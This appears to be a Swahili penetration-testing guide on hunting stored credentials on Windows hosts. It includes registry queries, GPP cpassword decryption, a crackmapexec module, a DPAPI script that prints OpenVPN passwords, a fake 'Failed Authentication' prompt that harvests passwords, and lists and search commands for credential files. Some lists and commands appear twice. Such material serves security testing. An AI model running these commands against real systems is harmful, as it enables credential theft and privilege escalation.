### Patches za mabadiliko zilizohifadhiwa na seva ya CI

Seva ya CI inaweza kuhifadhi mabadiliko ya msimbo wa chanzo yaliyowasilishwa kwenye saraka yake ya data hata baada ya build kukamilika. [TeamCity inaeleza](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) kuwa `system/changes` hutumika kuhifadhi mabadiliko ya remote-run; saraka ya data inaweza kusanidiwa na si lazima iwe chini ya `ProgramData`. Patch inayosomeka inaweza kuhifadhi marejeo yaliyoondolewa au kuongezwa ya faili ya kitambulisho, ufunguo wa usimbaji fiche, au script inayotumia vyote viwili. Kwa mfano, mtiririko wa `ConvertTo-SecureString -Key` wa PowerShell unahitaji ufunguo wa AES pamoja na maandishi yaliyosimbwa fiche; [Microsoft inaeleza](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring) kuwa ufunguo hutolewa kando. Kagua majina ya patches zinazoweza kufikiwa kwanza, kisha kagua maudhui yanayohusika kwa idhini bila kuchapisha siri kwenye matokeo ya kawaida ya uhesabuji. Njia ya patch, thamani iliyosimbwa fiche, au rejeo la ufunguo peke yake havithibitishi kitambulisho halali au ufikiaji wenye ruhusa za juu zaidi. Zuia ruhusa za ACL za saraka ya data na uepuke kuweka siri kwenye mabadiliko ya build.

### Mzunguko maalum wa nywila ya msimamizi wa ndani

Kibadilishaji nywila kilichotengenezwa ndani ya kampuni kinaweza kuhifadhi nywila iliyosimbwa fiche ya msimamizi wa ndani ndani ya huduma ya ndani, huku kikihifadhi vitambulisho vya datastore kwenye faili ya `.env` inayosomeka au karibu na binary ya kisasishaji. Kagua scheduled task, akaunti, ACL za usanidi, listener na ruhusa za datastore za kisasishaji kwa pamoja. Datastore inayosikiliza loopback pekee bado inaweza kufikiwa na mtumiaji wa ndani aliye na vitambulisho halali, lakini uthibitishaji peke yake hauthibitishi ruhusa ya kusoma rekodi husika. Ikiwa seed ya usimbaji fiche au nyenzo za ufunguo zinapatikana karibu na maandishi yaliyosimbwa fiche, kagua utokaji halisi wa ufunguo kabla ya kuamini usimbaji huo. Mpango unaotumia seed iliyofichuliwa kutengeneza ufunguo wa AES kwa njia ya kubainika kupitia Go's [`math/rand`](https://pkg.go.dev/math/rand) haufai kulinda nywila hiyo; Go inaeleza kuwa kifurushi hicho hakifai kwa nasibu inayohitaji usalama. Thibitisha kuwa nywila yoyote iliyorejeshwa bado inatumika na ni ya akaunti iliyo katika kundi la Administrators la ndani kabla ya kuichukulia kama njia ya kupandisha ruhusa. Scheduled task, njia ya `.env`, au data iliyosimbwa fiche peke yake havithibitishi hali hizo. Usijumuishe nywila na nyenzo za ufunguo kwenye matokeo ya kawaida ya uhesabuji.

Tumia [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) kudhibiti nywila za wasimamizi wa ndani. Hifadhi yake inayoungwa mkono na directory au Entra na vidhibiti vya ufikiaji ni tofauti na datastore maalum ya ndani; vivyo hivyo, [roles za Elasticsearch](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) huamua kama mtumiaji wa datastore aliyethibitishwa anaweza kusoma index maalum.

### Kumbukumbu za plugin za seva ya Java na matumizi tena ya vitambulisho

Baadhi ya plugin za seva ya Java husambazwa kama kumbukumbu za JAR kwenye saraka ya `plugins` ya seva. Plugin maalum inayosomeka inaweza kuwa na usanidi au bytecode iliyo na kitambulisho cha huduma kilichopachikwa. Kagua kumbukumbu hiyo tu ikiwa umeidhinishwa, na usijumuishe siri zilizorejeshwa kwenye matokeo ya kawaida ya uhesabuji. Njia ya plugin peke yake haithibitishi kuwa siri ipo, na nywila ya huduma iliyorejeshwa husababisha ruhusa za juu zaidi tu ikiwa inatumika pia kwa akaunti yenye ruhusa zaidi. Kagua ACL za faili husika na ubadilishe vitambulisho vilivyotumiwa tena kwa siri tofauti. Tazama [mwongozo wa usakinishaji wa plugin wa PaperMC](https://docs.papermc.io/paper/adding-plugins/) kwa mpangilio wa saraka na [hati za JAR za Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html) kwa maudhui ya kumbukumbu.

### Vitambulisho vya database iliyopachikwa ya Openfire

Usakinishaji wa Openfire unaotumia database yake iliyopachikwa unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua rekodi za `OFUSER` pamoja na sifa ya `passwordKey`. [Hati za Openfire za provider ya watumiaji](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa nywila zinaweza kuhifadhiwa kama maandishi ya kawaida au kusimbwa fiche kwa ufunguo ulio katika sifa hiyo. Nywila iliyorejeshwa ni muhimu kwa kupandisha ruhusa tu ikiwa bado inatumika kwa utambulisho wenye ruhusa zaidi; jina la faili peke yake halithibitishi ufikiaji wa kusoma wala matumizi tena ya kitambulisho. Njia hii ni kidokezo cha hesabu, kwa hiyo usijumuishe maudhui ya database na vitambulisho kwenye matokeo ya kawaida ya uhesabuji.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua porti zilizosanidiwa na interface ya bind ya dashibodi ya admin hata kama database ya nje inatumika. Openfire kwa kawaida hufunga dashibodi yake ya admin kwenye loopback; akaunti ya ndani bado inaweza kufikia anwani hiyo ikiwa listener inaendeshwa. Kagua listener halisi, role ya admin iliyoidhinishwa, sera ya kupakia plugin na utambulisho wa huduma ya Openfire kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kusababisha msimbo wa plugin kuendeshwa katika muktadha wa huduma, ambao unaweza kuwa na ruhusa za juu sana huduma ikiendeshwa kama LocalSystem. Nywila inayolingana ya akaunti au njia ya usanidi inayosomeka peke yake haithibitishi ufikiaji wa dashibodi ya admin wala utekelezaji wa msimbo. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [sifa ya API ya kupakia plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa seva ya usimamizi wa uchunguzi wa kidijitali

Usanidi wa seva ya Velociraptor, ambao kwa kawaida huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya CA ya ndani. Ikiwa mtumiaji mwenye ruhusa za chini anaweza kusoma ufunguo huo, anaweza kuweza kutengeneza cheti cha mteja cha API. Ikiwa hili litasababisha ruhusa za juu zaidi hutegemea roles za watumiaji wa seva, ufikikaji wa API, na utambulisho ambao seva au agent lengwa inaendeshwa nao. Usanidi wa mteja huwa na nyenzo tofauti; kuupata hakuthibitishi ufikiaji wa CA ya seva. Baadhi ya usakinishaji huweka ufunguo binafsi wa CA nje ya mtandao, kwa hiyo usanidi wa seva unaosomeka unaweza pia kukosa ufunguo wa kusaini.

Kwenye seva ya Windows, kagua ACL ya usanidi wa **seva** katika saraka yake ya usakinishaji na nakala zozote za akiba zilizolindwa. Eneo moja linalowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya huduma ikiwa ni tofauti. Thibitisha kuwa utambulisho wa sasa unaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuchapisha ufunguo binafsi kwenye logi au matokeo ya uhesabuji. Mtiririko wa `config api_client` wa vendor hutumia ufunguo wa CA kutoa cheti cha mteja, lakini role inayotumika upande wa seva pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji ruhusa ya kuandika datastore au kuwasha upya huduma. Utambulisho uliopo wa seva wenye ruhusa za juu unaweza kutoa njia hata kama ruhusa hizo za kuandika hazipo. Maswali ya API yenye haki za utekelezaji huendeshwa katika muktadha husika wa seva au agent, ambao unaweza kuwa na ruhusa za juu sana.

Linda usanidi wa seva na nakala za akiba kwa ACL zenye vizuizi, weka ufunguo wa kusaini wa CA nje ya mtandao inapowezekana, na punguza roles za API na ufikiaji wa listener. Tazama [hati za API za Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Vitambulisho vya PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni session manager tofauti. Hifadhi yake ya asili iliyosimbwa kwa njia fiche inaweza kuwa kwenye `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, huku nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa SolarWinds wa kuhamisha data](https://thwack.solarwinds.com/discussion/comment/115591) unasema kwamba exports husimbwa kwa nenosiri na zinaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lao la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi ya asili. Kwanza, kagua ruhusa na njia za faili. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kwamba credential yoyote iliyohifadhiwa bado ni halali au ina privileges za juu.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH keys kwenye registry

Funguo za faragha za SSH zinaweza kuhifadhiwa ndani ya registry key `HKCU\Software\OpenSSH\Agent\Keys`, kwa hiyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukikuta ingizo lolote ndani ya njia hiyo, huenda likawa SSH key iliyohifadhiwa. Limehifadhiwa likiwa limesimbwa kwa njia fiche, lakini linaweza kusimbuliwa kwa urahisi kwa kutumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha kompyuta, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda baadhi ya ssh keys, kuziongeza kwa kutumia `ssh-add` na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikubaini matumizi ya `dpapi.dll` wakati wa uthibitishaji wa asymmetric key.

### Faili zisizohudhuriwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi ukitumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Zipe kipaumbele folda za backup au image zinazoweza kufikiwa ndani ya mfumo, na kagua **majina ya vipengee** vya image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuliwa, na image za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi si njia sahihi. SMB share ni njia tofauti ya ufikiaji, na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya wigo. Tazama [mwongozo wa Microsoft kuhusu Windows image](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [rejea ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP lililohifadhiwa kwenye cache

Hapo awali kulikuwa na kipengele kilichoruhusu kusambaza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za kiusalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, manenosiri ndani ya GPP hizi, yaliyosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliokuwa umeandikwa hadharani, yangeweza kusimbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata ruhusa za juu.

Ili kupunguza hatari hii, kazi ilitengenezwa ili kutafuta faili za GPP zilizohifadhiwa ndani ya cache kwenye mashine za ndani na zenye sehemu ya "cpassword" isiyo tupu. Inapopata faili kama hiyo, kazi hiyo husimbua nenosiri na kurejesha kitu maalum cha PowerShell. Kitu hiki hujumuisha maelezo kuhusu GPP na mahali faili ilipo, hivyo kusaidia kutambua na kurekebisha athari hii ya kiusalama.

Tafuta faili hizi kwenye `C:\ProgramData\Microsoft\Group Policy\history` au katika _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye taarifa za kuingia:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Hifadhi rudufu za ZIP katika webroot ya IIS

Hifadhi rudufu ya zamani ya ZIP iliyowekwa moja kwa moja kwenye webroot inayotolewa inaweza kufichua faili za usanidi za awali na credentials zinazoweza kutumiwa tena. Angalia physical path iliyosanidiwa ya tovuti na kama archive inaweza kufikiwa kupitia HTTP kabla ya kuichukulia kuwa ni ufichuzi. Path chaguomsingi `C:\inetpub\wwwroot` ni chaguo linalowezekana tu. Orodha ya haraka ya faili za ndani inaweza kuonyesha majina na ukubwa bila kufungua archives:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kwamba ina siri au kwamba credential iliyopatikana inatoa privilege ya juu zaidi.

### Vitambulisho vya OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Kumbukumbu

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba taarifa za kuingia

Unaweza **kumwomba mtumiaji aweke taarifa zake za kuingia au hata taarifa za kuingia za mtumiaji mwingine** ikiwa unadhani anaweza kuzijua (kumbuka kwamba **kumwomba** mteja moja kwa moja **taarifa za kuingia** ni **hatari** sana):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na taarifa za kuingia**

Faili zinazojulikana ambazo wakati fulani zilikuwa na **nywila** katika **maandishi wazi** au **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Toleo la orodha ya majina ya faili bila kiendelezi cha Password Safe

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Database za Password Safe v3 kwa kawaida hutumia kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kama mgombea wa vault iliyosimbwa; kuwepo kwake hakuthibitishi kuwa unaweza kuisoma, kuifungua, au kutumia credentials zozote zilizohifadhiwa. Kagua profaili za watumiaji unazoweza kufikia na mizizi ya kushiriki faili iliyosanidiwa unapochunguza mahali faili hizo zimehifadhiwa.

Faili ya KeePass `.kdbx` inayosomeka pia ni kidokezo tu cha vault iliyosimbwa. Ili kuifungua, unahitaji master-password halisi na faili yoyote ya ufunguo au vipengele vya akaunti vilivyosaniwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya hash ya LM:NT katika ingizo, thibitisha akaunti iliyotajwa na kama NT hash hiyo ni ya sasa na inakubaliwa na huduma ya NTLM ya lengo kabla ya kuzingatia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault halikupi haki za Administrator au SYSTEM lenyewe; ufikiaji wa huduma ya mbali, haki za akaunti, na hatua yoyote tofauti ya kutekeleza huduma lazima pia ziwepo. Orodha ya mali inapaswa kuripoti njia ya vault na kama inasomeka, bila kuchapisha database au credentials zilizohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Lahaja ya amri ya kutafuta bila kiendelezi cha Password Safe

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Vitambulisho ndani ya RecycleBin

Unapaswa pia kuangalia Bin ili kutafuta vitambulisho ndani yake.

Kagua maingizo ya Recycle Bin unayoweza kufikia ili kutafuta nakala rudufu na kumbukumbu za usanidi zilizofutwa, pamoja na faili ambazo majina yake yanataja wazi vitambulisho. Nakala rudufu muhimu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia ya awali na muda wa kufutwa katika rekodi ya `$I`, na faili iliyofutwa kama ingizo lake linalolingana la `$R`; kagua metadata na ruhusa za kusoma za utambulisho wa sasa kabla ya kufungua kumbukumbu. Kuonekana kwa faili hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kuwa hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama mgombea wa ukaguzi, si uthibitisho kwamba lina siri halali.

Faili ya `.pfx` iliyofutwa unayoweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key unayoweza kufikia, key hiyo inaweza kusaini script ya PowerShell iliyobadilishwa; [PowerShell inahitaji cheti cha code-signing chenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za AppLocker za publisher hukagua utambulisho wa msaini na wigo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti unahitaji utambulisho wa sasa uweze kurekebisha script husika, sheria inayotumika ikubali saini inayotokana nayo kwa script na akaunti lengwa, na scheduled task au programu nyingine yenye mamlaka ya juu iitekeleze. Jina la faili la `.pfx`, subject ya cheti, au script inayoweza kuandikwa peke yake havithibitishi mnyororo huo. Kagua metadata, ACLs, sera, na amri ya scheduled task kabla ya kufungua nyenzo za private key au kuanzisha task hiyo.

Pia kagua hifadhidata za wasifu wa messaging-client, madokezo, na faili zilizopokelewa unazoweza kufikia ili kutafuta vidokezo vya vitambulisho. Export ya urejeshaji wa BitLocker inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala rudufu yenye jina. Nyenzo hizo zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche iliyo na nakala rudufu za zamani; kagua volume na kumbukumbu hiyo tu pale ufikiaji umeidhinishwa. Ikiwa nakala rudufu ina `NTDS.dit`, kurejesha vitambulisho vya domain nje ya mtandao kunahitaji pia hive ya `SYSTEM` inayolingana, kama ilivyoelezwa katika [mtiririko wa kazi wa nakala rudufu na vikundi vyenye mamlaka](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa peke yake havithibitishi kuwepo kwa recovery key inayoweza kutumika au nakala rudufu ya domain.

Ili **kurejesha passwords** zilizohifadhiwa na programu kadhaa unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vinavyowezekana vya registry vyenye vitambulisho**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya vivinjari

Unapaswa kuangalia hifadhidata ambamo nywila kutoka **Chrome au Firefox** zimehifadhiwa.\
Unapaswa kuangalia hifadhidata ambamo nywila kutoka **Chrome, Edge, au Firefox** zimehifadhiwa.\
Pia angalia historia, alamisho na vipendwa vya vivinjari ili kuona kama **nywila zimehifadhiwa** humo.

Kwa profaili ya kawaida ya **Default** ya Edge ya mtumiaji wa sasa, `Login Data` iko chini ya `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, huku `Local State` ikiwa kwenye saraka ya `User Data` iliyo juu yake. [Microsoft inaeleza eneo la kawaida la profaili](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); profaili nyingine au sera ya `UserDataDir` inaweza kuhamisha eneo hilo. Kuwepo kwa faili ni kidokezo tu cha hifadhi ya credentials: thibitisha kuwa faili zinaweza kusomeka, kuwa una muktadha wa DPAPI wa mtumiaji husika au nyenzo nyingine ya ufunguo iliyoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye ruhusa za juu zaidi. Kuhesabu faili kwa kutumia njia pekee hakuhitaji kufungua hifadhidata au kuchapisha nywila zilizofichuliwa.

